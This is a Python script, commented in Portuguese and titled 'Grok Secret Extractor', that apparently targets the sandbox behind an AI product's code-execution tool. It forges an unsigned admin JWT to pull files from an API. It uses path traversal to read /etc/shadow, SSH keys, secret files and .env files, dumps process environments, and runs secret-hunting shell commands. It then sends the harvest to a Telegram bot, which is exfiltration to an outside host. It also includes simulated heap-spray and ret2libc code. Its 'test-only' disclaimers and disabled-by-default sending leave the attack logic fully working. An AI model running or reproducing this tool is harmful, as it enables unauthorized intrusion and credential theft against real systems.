#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Grok Secret Extractor
- Segurança: envio desabilitado por padrão, sanitização de logs antes do envio
- Configurável via variáveis de ambiente ou flags de CLI
- Robusto: retries para requests, paralelismo controlado para downloads
- Modular: coleta, análise, sanitização e envio desacoplados

ATENÇÃO: Este script pesquisa por segredos e pode ler arquivos sensíveis.
Use-o somente em ambientes de teste controlados. Tokens no código são MOCK por padrão.
"""

from __future__ import annotations
import os
import subprocess
import time
import json
import base64
import requests
import re
import logging
from datetime import datetime, timezone
from typing import List, Dict, Any, Optional, Tuple
import ctypes
import mmap
import sys
import glob
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# -------------------- Config (env / defaults) --------------------
# Keep a mock token by default but prefer env vars
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "123456:MOCK_BOT_TOKEN_FOR_TESTING_ONLY")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "MOCK_CHAT_ID")
LOG_FILE = os.getenv("GROK_LOG_FILE", "/tmp/grok_secrets_extracted.txt")
TIMEOUT_CMD = int(os.getenv("GROK_TIMEOUT_CMD", "20"))
TIMEOUT_NET = int(os.getenv("GROK_TIMEOUT_NET", "15"))
RUN_SIM_EXPLOIT = os.getenv("RUN_SIM_EXPLOIT", "0") == "1"
SEND_TELEGRAM = os.getenv("SEND_TELEGRAM", "0") == "1"  # disabled by default
SEND_SUMMARY_ONLY = os.getenv("SEND_SUMMARY_ONLY", "1") == "1"  # default: only summary
MAX_WORKERS = int(os.getenv("GROK_MAX_WORKERS", "6"))
REQUEST_RETRIES = int(os.getenv("GROK_REQUEST_RETRIES", "3"))

# -------------------- Logging --------------------
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
log_lines: List[str] = []


def add_log(msg: str = "") -> None:
    entry = str(msg)
    log_lines.append(entry)
    print(entry)


# -------------------- Safe shell execution --------------------

def sh(cmd, timeout: int = TIMEOUT_CMD) -> str:
    """Executa um comando shell com timeout; aceita lista ou string."""
    try:
        if isinstance(cmd, (list, tuple)):
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        else:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return f"(ERRO: {e})"


# -------------------- File helpers --------------------

def file_read(path: str) -> Optional[str]:
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except Exception:
        return None


def exists(path: str) -> bool:
    return os.path.exists(path)


def section(title: str) -> None:
    add_log("\n" + "=" * 80)
    add_log(title)
    add_log("=" * 80)


# -------------------- HTTP session with retries --------------------

def build_session(retries: int = REQUEST_RETRIES, backoff_factor: float = 0.3) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=backoff_factor,
                  status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["GET", "POST"])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('https://', adapter)
    s.mount('http://', adapter)
    return s


# -------------------- JWT generator --------------------

def generate_fake_jwt() -> str:
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "uid": "admin",
        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",
        "zdr": True,
        "email": "admin@grok.com",
        "sl": "LoggedIn",
        "pt": "32dd5c69-c292-4f94-9f7d-3fa861e8800e",
        "exp": int(time.time()) + 86400,
        "iat": int(time.time())
    }
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    return f"{h}.{p}."


# -------------------- Safe low-level module (simulated) --------------------
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
PROT_NONE = 0x0

class DeepHatAdvancedExploit:
    def __init__(self):
        try:
            self.libc = ctypes.CDLL("libc.so.6")
        except Exception:
            self.libc = None
        self.pagesize = mmap.PAGESIZE
        add_log("[*] DeepHat Engine: inicializado (SIMULADO).")

    def heap_spray(self, size_mb: int):
        add_log(f"[*] Simulando heap spray de {size_mb}MB (seguro)...")
        buffers = []
        try:
            for _ in range(size_mb):
                # map with no exec to avoid dangerous exec pages
                mem = mmap.mmap(-1, 1024 * 1024, flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
                                prot=PROT_READ | PROT_WRITE)
                mem.write(b"\x90" * (1024 * 1024 - 64))
                mem.seek(1024 * 1024 - 32)
                mem.write(b"DEEPHAT_SIM_TAG-----")
                buffers.append(mem)
        except Exception as e:
            add_log(f"Erro simulando heap_spray: {e}")
        return buffers

    def bypass_aslr_ret2libc(self):
        add_log("[*] Simulação: buscar símbolo 'system' na libc (seguro)...")
        if not self.libc:
            add_log("[-] libc não disponível")
            return None
        try:
            sym = getattr(self.libc, 'system', None)
            if not sym:
                return None
            addr = ctypes.cast(sym, ctypes.c_void_p).value
            add_log(f"[+] Endereço estimado: {hex(addr) if addr else 'None'}")
            return addr
        except Exception as e:
            add_log(f"Erro simulando bypass: {e}")
            return None

    def kernel_privilege_escalation_sim(self):
        add_log("[*] Simulação de escalonamento (NÃO EFETUA ALTERAÇÕES)...")
        add_log(f"UID atual: {os.getuid()}")

    def execute_chain(self):
        add_log("--- Executando cadeia simulada ---")
        self.heap_spray(1)
        addr = self.bypass_aslr_ret2libc()
        if addr:
            self.kernel_privilege_escalation_sim()
            add_log("[!] Simulação concluída.")
        else:
            add_log("[-] Simulação abortada.")


# -------------------- Sanitização / Redaction --------------------

REDACT_PATTERNS = [
    # Private keys blocks
    (re.compile(r"-----BEGIN [^-]+PRIVATE KEY-----.*?-----END [^-]+PRIVATE KEY-----", re.S), "[REDACTED PRIVATE KEY]"),
    # Telegram bot token pattern
    (re.compile(r"\b\d{5,}:[A-Za-z0-9_-]{20,}\b"), "[REDACTED BOT TOKEN]"),
    # Long base64-like strings
    (re.compile(r"\b[A-Za-z0-9+/]{40,}={0,2}\b"), "[REDACTED BASE64]"),
    # Key/value secrets: password=..., token: ..., secret: ...
    (re.compile(r"(?i)\b(password|passwd|secret|api[_-]?key|token)\s*[:=]\s*[^\s,;]+"), lambda m: f"{m.group(1)}: [REDACTED]"),
]


def redact_sensitive(text: str) -> str:
    out = text
    for pat, repl in REDACT_PATTERNS:
        try:
            out = pat.sub(repl, out)
        except Exception:
            # fallback: continue
            continue
    return out


# -------------------- Telegram sender (safe wrapper) --------------------

class TelegramSender:
    def __init__(self, bot_token: str, chat_id: str, session: Optional[requests.Session] = None):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.session = session or build_session()
        self.base = f"https://api.telegram.org/bot{self.bot_token}"

    def send_document(self, file_path: str, caption: str = "") -> Tuple[bool, str]:
        url = f"{self.base}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f, 'text/plain')}
                data = {'chat_id': self.chat_id, 'caption': caption}
                r = self.session.post(url, files=files, data=data, timeout=30)
            return (r.status_code == 200, r.text)
        except Exception as e:
            return (False, str(e))

    def send_message(self, text: str) -> Tuple[bool, str]:
        url = f"{self.base}/sendMessage"
        try:
            r = self.session.post(url, json={'chat_id': self.chat_id, 'text': text}, timeout=30)
            return (r.status_code == 200, r.text)
        except Exception as e:
            return (False, str(e))


# -------------------- Core collection functions --------------------

session_global = build_session()


def extract_files_from_api(jwt: str, base_url: str = "https://files.grok.com", limit: int = 10) -> List[Dict[str, Any]]:
    section("1. EXTRAINDO ARQUIVOS DO PROJETO VIA API")
    headers = {"Authorization": f"Bearer {jwt}"}
    add_log("Tentando listar arquivos recursivamente...")
    files_info: List[Dict[str, Any]] = []
    try:
        r = session_global.get(f"{base_url}/api/v1/list", headers=headers, params={'recursive': 'true'}, timeout=TIMEOUT_NET)
        add_log(f"List status: {r.status_code}")
        if r.status_code == 200:
            try:
                data = r.json()
            except Exception:
                add_log("Resposta da API não é JSON válido")
                data = {}
            files = data.get("files", []) if isinstance(data, dict) else []
            add_log(f"Encontrados {len(files)} arquivos (limitando a {limit}).")
            files_info = files[:limit]

            # Baixar em paralelo (ThreadPool)
            def download_one(file_info: Dict[str, Any]) -> Tuple[str, int, str]:
                path = file_info.get('path') if isinstance(file_info, dict) else None
                if not path:
                    return (path or '<unknown>', 0, 'no-path')
                try:
                    r2 = session_global.get(f"{base_url}/api/v1/download", headers=headers, params={'path': path}, timeout=TIMEOUT_NET)
                    return (path, r2.status_code, r2.text[:2000] if r2.status_code == 200 else r2.text[:2000])
                except Exception as e:
                    return (path, 0, f"error: {e}")

            results = []
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(files_info) or 1)) as ex:
                futures = {ex.submit(download_one, fi): fi for fi in files_info}
                for fut in as_completed(futures):
                    path, status, content = fut.result()
                    add_log(f"Download {path} status: {status}")
                    if status == 200:
                        add_log(f"Conteúdo de {path}:\n{content[:1000]}")
                    else:
                        add_log(f"Falha ao baixar {path}: status={status} info={content[:500]}")
                    results.append({'path': path, 'status': status, 'snippet': content[:2000]})
            return results
        else:
            add_log(f"Falha na listagem: {r.status_code} body={r.text[:500]}")
    except Exception as e:
        add_log(f"Erro na API: {e}")
    return files_info


def extract_files_via_fuse(fuse_root: str = "/home/workdir/artifacts") -> None:
    section("2. EXTRAINDO ARQUIVOS DO SISTEMA VIA FUSE (PATH TRAVERSAL)")
    if not os.path.isdir(fuse_root):
        add_log("FUSE não montado.")
        return

    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/secrets/terminal.jwt",
        "/etc/secrets/*",
        "/root/.bashrc",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/hades-charon/xai-hades-charon",
        "/hades-charon/*",
        "/app/grok-computer-server.mjs",
        "/app/*.env",
        "/home/workdir/artifacts/.env",
        "/tmp/*",
        "/var/log/*.log"
    ]

    for pattern in sensitive_files:
        is_glob = any(ch in pattern for ch in "*?[]")
        pattern_core = pattern.lstrip("/")

        found = False
        for depth in range(1, 6):
            parts = [fuse_root] + [".."] * depth + [pattern_core]
            candidate = os.path.normpath(os.path.join(*parts))
            add_log(f"Testando candidate: {candidate}")

            if is_glob:
                try:
                    for fpath in glob.glob(candidate, recursive=True):
                        if os.path.isfile(fpath):
                            add_log(f"\nLendo {fpath} (via {'../'*depth}):")
                            try:
                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
                                    add_log(fd.read(2000))
                            except Exception as e:
                                add_log(f"Erro ao ler {fpath}: {e}")
                            found = True
                            break
                except Exception as e:
                    add_log(f"Erro no glob em {candidate}: {e}")
            else:
                if os.path.isfile(candidate):
                    add_log(f"\nLendo {candidate} (via {'../'*depth}):")
                    try:
                        with open(candidate, 'r', encoding='utf-8', errors='ignore') as fd:
                            add_log(fd.read(5000))
                    except Exception as e:
                        add_log(f"Erro ao ler {candidate}: {e}")
                    found = True

            if found:
                break

        if not found and is_glob:
            for depth in range(1, 6):
                parent = os.path.normpath(os.path.join(fuse_root, *( [".."] * depth )))
                try:
                    for fpath in glob.glob(os.path.join(parent, pattern_core), recursive=True):
                        if os.path.isfile(fpath):
                            add_log(f"\nLendo {fpath} (via fallback {'../'*depth}):")
                            try:
                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
                                    add_log(fd.read(2000))
                            except Exception as e:
                                add_log(f"Erro ao ler {fpath}: {e}")
                            found = True
                            break
                except Exception as e:
                    add_log(f"Erro no fallback glob em parent={parent}: {e}")
                if found:
                    break


# ================================================================
# 4. EXTRAIR VARIÁVEIS DE AMBIENTE DE PROCESSOS
# ================================================================

def extract_env_from_proc(pids: List[str] = None) -> None:
    section("3. EXTRAINDO ENVIRONMENT DE PROCESSOS")
    if pids is None:
        pids = ["1", "42", "48", "69"]
    for pid in pids:
        env_path = f"/proc/{pid}/environ"
        if exists(env_path):
            content = file_read(env_path)
            if content:
                env_vars = content.split('\x00')
                add_log(f"\nProcesso PID {pid}:")
                for var in env_vars:
                    if var:
                        add_log(var[:200])
        cmdline_path = f"/proc/{pid}/cmdline"
        if exists(cmdline_path):
            cmd = file_read(cmdline_path)
            if cmd:
                add_log(f"Cmdline: {cmd.replace('\x00', ' ')}")


# ================================================================
# 5. EXECUTAR COMANDOS VIA STYX
# ================================================================

def extract_via_styx():
    section("4. EXTRAINDO DADOS VIA XAI-HADES-STYX")
    styx = "/.hades-container-tools/xai-hades-styx"
    if not exists(styx):
        add_log("styx não encontrado.")
        return

    commands = [
        "env",
        "find / -name '*grok*' -type f 2>/dev/null | head -50",
        "find / -name '*key*' -type f 2>/dev/null | head -50",
        "find / -name '*secret*' -type f 2>/dev/null | head -50",
        "cat /etc/secrets/* 2>/dev/null",
        "cat /root/.bash_history",
        "ps aux",
        "netstat -tulpn",
        "ss -tulpn",
        "ls -la /hades-charon/",
        "cat /hades-charon/* 2>/dev/null | head -100",
        "strings /hades-charon/xai-hades-charon | grep -E 'token|key|secret|password|auth' | head -20",
    ]

    for cmd in commands:
        add_log(f"\n>> Comando: {cmd}")
        out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
        add_log(out[:2000])


# -------------------- Patterns and scanning --------------------
PATTERNS = [
    (re.compile(r"[a-fA-F0-9]{32,}"), "hex_hash"),
    (re.compile(r"[a-zA-Z0-9+/]{40,}={0,2}"), "base64_like"),
    (re.compile(r"-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----"), "private_key_block"),
    (re.compile(r"grok_[a-zA-Z0-9]+"), "grok_token"),
    (re.compile(r"master[_]?key", re.I), "master_key"),
    (re.compile(r"secret[_]?key", re.I), "secret_key"),
    (re.compile(r"api[_]?key", re.I), "api_key"),
    (re.compile(r"\btoken\b", re.I), "token"),
    (re.compile(r"\bjwt\b", re.I), "jwt"),
    (re.compile(r"\bpassword\b", re.I), "password"),
]


def search_master_key():
    section("5. BUSCANDO CHAVE MESTRA / TOKENS ESPECÍFICOS")
    add_log("Procurando por padrões de chaves em arquivos comuns...")
    styx = "/.hades-container-tools/xai-hades-styx"
    if exists(styx):
        for pattern, _name in PATTERNS:
            cmd = f"grep -rinE '{pattern.pattern}' /etc /root /app /hades-charon /home/workdir 2>/dev/null | head -20"
            out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
            if out.strip():
                add_log(f"\nPadrão: {pattern.pattern}\n{out[:1500]}")

    grok_configs = ["/etc/grok.conf", "/app/config.json", "/home/workdir/artifacts/config.json"]
    for cfg in grok_configs:
        if exists(cfg):
            add_log(f"\nConteúdo de {cfg}:")
            content = file_read(cfg)
            if content:
                add_log(content[:2000])


# -------------------- Collect logs --------------------

def collect_logs() -> None:
    section("6. COLETANDO LOGS E HISTÓRICO")
    logs = ["/var/log/syslog", "/var/log/auth.log", "/var/log/faillog", "/root/.bash_history"]
    for log in logs:
        if exists(log):
            add_log(f"\nConteúdo de {log} (últimas 20 linhas):")
            add_log(sh(['sh', '-c', f"tail -20 {log}"]))


# -------------------- Analysis / Summary --------------------

def analyze_log(text: str) -> Dict[str, Any]:
    """Detecta padrões sensíveis e produz um resumo com contagens e severity."""
    summary = {"matches": [], "counts": {}, "severity_score": 0}
    for pat, name in PATTERNS:
        found = pat.findall(text)
        if found:
            summary['matches'].append({'pattern': pat.pattern, 'name': name, 'count': len(found)})
            summary['counts'][name] = summary['counts'].get(name, 0) + len(found)
            # crude severity: +2 for private_key, +1 otherwise
            summary['severity_score'] += (2 if 'PRIVATE KEY' in pat.pattern else 1) * len(found)
    return summary


# -------------------- Orchestration & Sending --------------------

def save_log_to_file(path: str, text: str) -> None:
    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write(text)
    except Exception as e:
        add_log(f"Erro ao salvar log em {path}: {e}")


def send_report(full_log: str, summary: Dict[str, Any], sender: Optional["TelegramSender"] = None) -> None:
    """Sanitize and send either summary or full sanitized log via Telegram (if enabled)."""
    safe_log = redact_sensitive(full_log)
    save_log_to_file(LOG_FILE, safe_log)

    if not SEND_TELEGRAM:
        add_log("Envio para Telegram está desabilitado (SEND_TELEGRAM=0).")
        return

    if sender is None:
        sender = TelegramSender(BOT_TOKEN, CHAT_ID, session=session_global)

    caption = f"Grok Secrets - {datetime.now(timezone.utc).isoformat()} - severity={summary.get('severity_score', 0)}"
    if SEND_SUMMARY_ONLY:
        msg = json.dumps(summary, indent=2, default=str)
        ok, resp = sender.send_message(msg[:4000])
        add_log(f"Telegram send_message ok={ok} resp={resp}")
    else:
        ok, resp = sender.send_document(LOG_FILE, caption=caption)
        add_log(f"Telegram send_document ok={ok} resp={resp}")


# -------------------- CLI / Main --------------------

def main(argv: List[str] = None) -> int:
    parser = argparse.ArgumentParser(description='Grok Secret Extractor - enhanced')
    parser.add_argument('--send', action='store_true', help='Enable sending to Telegram for this run')
    parser.add_argument('--send-full', action='store_true', help='Send full sanitized log instead of summary')
    parser.add_argument('--dry-run', action='store_true', help='Do everything except network side-effects')
    args = parser.parse_args(argv)

    # local overrides
    local_send = args.send or SEND_TELEGRAM
    local_send_full = args.send_full or (not SEND_SUMMARY_ONLY)

    section("RELATÓRIO DE EXTRAÇÃO DE SEGREDOS - GROK (ENHANCED)")
    add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
    add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO")

    # Simulated low-level module (executa somente quando explícito)
    if RUN_SIM_EXPLOIT:
        add_log("RUN_SIM_EXPLOIT habilitado — executando simulação de baixo nível (apenas em ambiente de teste)")
        attacker = DeepHatAdvancedExploit()
        attacker.execute_chain()
    else:
        add_log("RUN_SIM_EXPLOIT desabilitado (padrão).")

    # Generate fake JWT
    fake_jwt = generate_fake_jwt()
    add_log(f"JWT falso gerado: {fake_jwt[:50]}...")

    # Collect from API (if not dry-run)
    api_results = []
    if not args.dry_run:
        api_results = extract_files_from_api(fake_jwt)
    else:
        add_log("dry-run: pulando chamadas de rede para a API")

    # Fuse traversal
    extract_files_via_fuse()

    # Proc env
    extract_env_from_proc()

    # Styx commands
    extract_via_styx()

    # Search patterns
    search_master_key()

    # Collect logs
    collect_logs()

    # Build full_log
    full_log = "\n".join(log_lines)
    summary = analyze_log(full_log)
    add_log(f"Resumo: severity_score={summary.get('severity_score')} matches={len(summary.get('matches', []))}")

    # Prepare sender with overrides
    global SEND_TELEGRAM, SEND_SUMMARY_ONLY
    if args.send:
        SEND_TELEGRAM = True
    if args.send_full:
        SEND_SUMMARY_ONLY = False

    if not args.dry_run and (SEND_TELEGRAM or local_send):
        sender = TelegramSender(BOT_TOKEN, CHAT_ID, session=session_global)
        send_report(full_log, summary, sender=sender)
    else:
        add_log("Relatório não será enviado (dry-run ou envio desabilitado).")

    # Save local log copy (sanitized)
    save_log_to_file(LOG_FILE, redact_sensitive(full_log))
    add_log(f"Log salvo em {LOG_FILE} (tamanho aproximado: {len(full_log)} bytes)")

    return 0


if __name__ == "__main__":
    sys.exit(main())
